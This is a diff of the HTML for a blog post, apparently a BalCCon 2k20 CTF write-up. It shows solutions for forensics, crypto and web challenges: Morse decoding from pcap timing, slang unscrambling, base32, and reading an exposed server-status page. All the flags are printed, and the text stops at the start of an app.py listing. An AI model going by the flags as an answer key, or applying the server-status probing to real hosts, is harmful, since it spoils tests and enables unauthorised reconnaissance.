@@ -1,99 +1,95 @@
 <!DOCTYPE html>
-<html>
-<head>
-	<meta charset="utf-8" />
-	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>BalCCon 2k20 CTF Write Up - AJDIN</title><link rel="icon" type="image/png" href=/favicon.ico /><meta name="viewport" content="width=device-width, initial-scale=1">
-	<meta property="og:title" content="BalCCon 2k20 CTF Write Up" />
-<meta property="og:description" content="This is a BalCCon 2k20 Write Up by imm0rtals
-forensics/Patience  Strange&hellip; Everything looks the same. But there is some message hidden, I am sure!" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://ajdin.io/posts/ctf-balccon-2020/" />
-<meta property="article:published_time" content="2020-09-26T19:17:05+02:00" />
-<meta property="article:modified_time" content="2020-09-26T19:17:05+02:00" />
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="BalCCon 2k20 CTF Write Up"/>
-<meta name="twitter:description" content="This is a BalCCon 2k20 Write Up by imm0rtals
-forensics/Patience  Strange&hellip; Everything looks the same. But there is some message hidden, I am sure!"/>
-<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:200,300" rel="stylesheet">
-
-	<link rel="stylesheet" type="text/css" media="screen" href="https://ajdin.io/css/normalize.css" />
-	<link rel="stylesheet" type="text/css" media="screen" href="https://ajdin.io/css/main.css" /><link rel="stylesheet" type="text/css" href="https://ajdin.io/css/dark.css"  />
-
-	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
-	<script src="https://ajdin.io/js/main.js"></script>
-	<script src="https://ajdin.io/cookieconsent.js"></script>
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/css/style.css">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Vollkorn:ital,wght@0,400;0,500;0,600;0,700;0,800;0,900;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    
+    
+    <title>BalCCon 2k20 CTF Write Up | Ajdin&#39;s blog</title>
 </head>
-
 <body>
-	<div class="container wrapper post">
-		<div id="cookies-eu-banner" style="display: none;" >
-    	By continuing to visit this site, you accept the use of anonymized cookies for analytics.
-	<a href="https://ajdin.io/privacy" id="cookies-eu-more">Read more</a>.
-	
-	<button id="cookies-eu-accept"><a>Accept</a></button>
+        <div class="container"><div id="header">
+    <div id="header-top">
+        <div id="header-left">
+            <a href="/" class="link-fix">
+            <h1 class="title"> Ajdin&#39;s blog</h1>
+            <h3 class="handle">@ajdintrejic</h3>
+            </a>
+        </div>
+        <div id="header-right">
+            
+            
+            
+             
+            
+              <a class="social-icons__link" rel="me" title="Twitter"
+                 href="https://twitter.com/ajdintrejic"
+                 target="_blank" rel="noopener">
+                <div class="social-icons__icon" style="background-image: url('')"></div>
+                <i data-feather="twitter"></i>
+        
+              </a>
+            
+          
+             
+            
+              <a class="social-icons__link" rel="me" title="GitHub"
+                 href="https://github.com/ajdintrejic"
+                 target="_blank" rel="noopener">
+                <div class="social-icons__icon" style="background-image: url('')"></div>
+                <i data-feather="github"></i>
+        
+              </a>
+            
+          
+             
+            
+              <a class="social-icons__link" rel="me" title="RSS"
+                 href="/index.xml"
+                 target="_blank" rel="noopener">
+                <div class="social-icons__icon" style="background-image: url('')"></div>
+                <i data-feather="rss"></i>
+        
+              </a>
+            
+             
+        </div>
+    </div>
+    <div class="nav-bar">
+        
+        <a class="nav-item link-fix" href="/">
+                
+                Home
+        </a>
+        
+        <a class="nav-item link-fix" href="/about">
+                
+                About
+        </a>
+        
+        <a class="nav-item link-fix" href="/tags">
+                
+                Tags
+        </a>
+        
+    </div>
 </div>
-<div class="header">
-	<base href="https://ajdin.io/">
+
+<div id="content">
+<h2 class="post-title">BalCCon 2k20 CTF Write Up</h2>
 
 
 
-	<h1 class="site-title"><a href="https://ajdin.io/">AJDIN</a></h1>
-	<div class="site-description"><h2>ajdin.io</h2><nav class="nav social">
-			<ul class="flat"><a href="https://github.com/ajdintrejic" title="Github"><i data-feather="github"></i></a><a href="https://twitter.com/ajdintrejic" title="Twitter"><i data-feather="twitter"></i></a><a href="mailto:ajdintrejic@protonmail.ch" title="Mail"><i data-feather="mail"></i></a><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></ul>
-		</nav>
-	</div>
-
-	<nav class="nav">
-		<ul class="flat">
-			
-			<li>
-				<a href="/">Home</a>
-			</li>
-			
-			<li>
-				<a href="/posts">Archive</a>
-			</li>
-			
-			<li>
-				<a href="/about">About</a>
-			</li>
-			
-			<li>
-				<a href="/tags">Tags</a>
-			</li>
-			
-		</ul>
-	</nav>
-</div>
+<div class="date">Sep 26, 2020</div>
 
 
-		<div class="post-header">
-			<h1 class="title">BalCCon 2k20 CTF Write Up</h1>
-			<div class="meta">Posted at &mdash; Sep 26, 2020</div>
-		</div>
 
-		
-		<div class="toc">              
-			<h3>Table of Contents</h3>
-			<nav id="TableOfContents">
-  <ul>
-    <li><a href="https://ajdin.io/posts/ctf-balccon-2020/#forensicspatience">forensics/Patience</a></li>
-    <li><a href="https://ajdin.io/posts/ctf-balccon-2020/#welcomemy-glass-is-empty">welcome/My glass is empty?</a></li>
-    <li><a href="https://ajdin.io/posts/ctf-balccon-2020/#cryptoslang-back">crypto/Slang Back</a></li>
-    <li><a href="https://ajdin.io/posts/ctf-balccon-2020/#cryptotwice-cooler">crypto/Twice Cooler</a></li>
-    <li><a href="https://ajdin.io/posts/ctf-balccon-2020/#webnavajo">web/Navajo</a></li>
-    <li><a href="https://ajdin.io/posts/ctf-balccon-2020/#webtwo-sides-of-a-coin">web/Two Sides of a Coin</a></li>
-    <li><a href="https://ajdin.io/posts/ctf-balccon-2020/#webimgr">web/Imgr</a></li>
-    <li><a href="https://ajdin.io/posts/ctf-balccon-2020/#weblet-me-see">web/Let Me See</a></li>
-  </ul>
-</nav>
-			<hr>
-		</div>              
-		
-		</aside>              
+<br/>
 
-		<div class="markdown">
-              		
 <p><img src="/ctf-balccon-2020/6.png" alt="">
 This is a BalCCon 2k20 Write Up by imm0rtals</p>
 <h2 id="forensicspatience">forensics/Patience<a class="anchor" href="#forensicspatience">#</a></h2>
@@ -102,21 +98,7 @@ This is a BalCCon 2k20 Write Up by imm0rtals</p>
 </blockquote>
 <p>We are given a .pcap file and if we look at the duration
 <img src="/ctf-balccon-2020/7.png" alt=""></p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> durs:
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> durs:
 <span style="color:#f92672">...</span>     <span style="color:#66d9ef">if</span> i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0.20</span>:
 <span style="color:#f92672">...</span>             morse <span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;.&#39;</span>
 <span style="color:#f92672">...</span>     <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0.5</span> <span style="color:#f92672">and</span> i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>:
@@ -126,62 +108,25 @@ This is a BalCCon 2k20 Write Up by imm0rtals</p>
 <span style="color:#f92672">...</span> 
 <span style="color:#f92672">&gt;&gt;&gt;</span> morse
 <span style="color:#e6db74">&#39;-... -.-. - ..-.  -.-. --- ...- . .-. -  - .. -- .. -. --.  -.-. .... .- -. -. . .-..  .- - - .- -.-. -.-  .- -  -.. .- .-- -.  .&#39;</span>
-</code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{COVERT_TIMING_CHANNEL_ATTACK_AT_DAWN}
-</code></pre></td></tr></table>
-</div>
-</div><hr>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{COVERT_TIMING_CHANNEL_ATTACK_AT_DAWN}
+</code></pre></div><hr>
 <h2 id="welcomemy-glass-is-empty">welcome/My glass is empty?<a class="anchor" href="#welcomemy-glass-is-empty">#</a></h2>
 <blockquote>
 <p>Let&rsquo;s change that and hang out with us in IRC :)</p>
 </blockquote>
 <p>Connect to #balccon2k20-ctf IRC and get the flag</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{pour_me_one_more_rakija}
-</code></pre></td></tr></table>
-</div>
-</div><hr>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{pour_me_one_more_rakija}
+</code></pre></div><hr>
 <h2 id="cryptoslang-back">crypto/Slang Back<a class="anchor" href="#cryptoslang-back">#</a></h2>
 <blockquote>
 <p>These youngsters speak some weird language. Does it make any sense at all?!</p>
 </blockquote>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">}ejnsergazaku_ejnevazakilu_ejndejazanu_ejnibazou_ib_ejnizaztovu_ejnumazekizu_zeb{ejnbazftcu
-</code></pre></td></tr></table>
-</div>
-</div><p>Reverse it</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">uctfzabnje{bez_uzikezamunje_uvotzazinje_bi_uozabinje_unazajednje_ulikazavenje_ukazagresnje}
-</code></pre></td></tr></table>
-</div>
-</div><p>Remove &ldquo;u&rdquo;, &ldquo;za&rdquo; and &ldquo;nje&rdquo;</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ctfb{bez_zikemu_votzi_bi_obi_najed_likave_kagres}
-</code></pre></td></tr></table>
-</div>
-</div><p>Move some letters arround to create proper Serbian words (Remember this CTF was hosted in Serbia?):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">}ejnsergazaku_ejnevazakilu_ejndejazanu_ejnibazou_ib_ejnizaztovu_ejnumazekizu_zeb{ejnbazftcu
+</code></pre></div><p>Reverse it</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">uctfzabnje{bez_uzikezamunje_uvotzazinje_bi_uozabinje_unazajednje_ulikazavenje_ukazagresnje}
+</code></pre></div><p>Remove &ldquo;u&rdquo;, &ldquo;za&rdquo; and &ldquo;nje&rdquo;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ctfb{bez_zikemu_votzi_bi_obi_najed_likave_kagres}
+</code></pre></div><p>Move some letters arround to create proper Serbian words (Remember this CTF was hosted in Serbia?):</p>
 <ul>
 <li>ctfb -&gt; bctf</li>
 <li>zikemu -&gt; muzike (music)</li>
@@ -191,15 +136,8 @@ This is a BalCCon 2k20 Write Up by imm0rtals</p>
 <li>likave -&gt; velika (big)</li>
 <li>kagres -&gt; greska (mistake)</li>
 </ul>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{bez_muzike_zivot_bi_bio_jedna_velika_greska}
-</code></pre></td></tr></table>
-</div>
-</div><p>Which translates to:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{bez_muzike_zivot_bi_bio_jedna_velika_greska}
+</code></pre></div><p>Which translates to:</p>
 <blockquote>
 <p>Without music life would be one big mistake</p>
 </blockquote>
@@ -209,140 +147,22 @@ This is a BalCCon 2k20 Write Up by imm0rtals</p>
 <p>We received the message which resembles some very familiar encoding&hellip; But not exactly it.</p>
 </blockquote>
 <p>The message has almost 40000 characters, just base32 decode over and over and you get:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{base32_is_c00ler_than_base64_s0meh0w}
-</code></pre></td></tr></table>
-</div>
-</div><hr>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{base32_is_c00ler_than_base64_s0meh0w}
+</code></pre></div><hr>
 <h2 id="webnavajo">web/Navajo<a class="anchor" href="#webnavajo">#</a></h2>
 <blockquote>
 <p>What is the status of Navajo tribes nowadays?</p>
 </blockquote>
 <p>Open <code>https://navajo.pwn.institute/server-status</code> and check logs (note: you might have to wait if the log request is not there)</p>
 <p><img src="/ctf-balccon-2020/1.png" alt=""></p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{extremely_secret_url_no_one_can_guess}
-</code></pre></td></tr></table>
-</div>
-</div><hr>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{extremely_secret_url_no_one_can_guess}
+</code></pre></div><hr>
 <h2 id="webtwo-sides-of-a-coin">web/Two Sides of a Coin<a class="anchor" href="#webtwo-sides-of-a-coin">#</a></h2>
 <blockquote>
 <p>Bulletin Board where you can buy or sell cool stuff. Check it out: <a href="https://two-sides-of-a-coin.pwn.institute">https://two-sides-of-a-coin.pwn.institute</a></p>
 </blockquote>
 <p>CTF challege provides us with app.py:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
